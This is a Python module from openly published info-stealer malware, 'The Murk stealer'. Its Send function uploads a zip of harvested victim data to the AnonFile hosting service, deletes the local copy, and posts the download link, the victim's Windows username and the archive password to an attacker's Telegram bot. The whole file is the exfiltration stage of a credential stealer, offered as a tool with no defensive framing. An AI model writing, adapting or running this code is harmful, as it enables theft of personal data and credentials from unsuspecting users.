#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import requests
from anonfile import AnonFile
import os


def Send(Token,ID,np):

	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		PCuser = os.environ['USERPROFILE']
		file = AnonFile()
		try: 
			upload = file.upload(rf'{np[0]}.zip', progressbar=True)
		except Exception as e:
			print(e)
		try:
			os.remove(f'{np[0]}.zip')
			pass
		except Exception as e:
			print(e)
		url = upload.url.geturl()
		print(url)
		message = f'The Murk results\nUser: {PCuser}\nLink: {url}\nPassword: {np[1]}'
		params = {
    		'chat_id': ID,
    		'text': message,
		}
		response = requests.get('https://api.telegram.org/bot'+Token+'/sendMessage', params=params)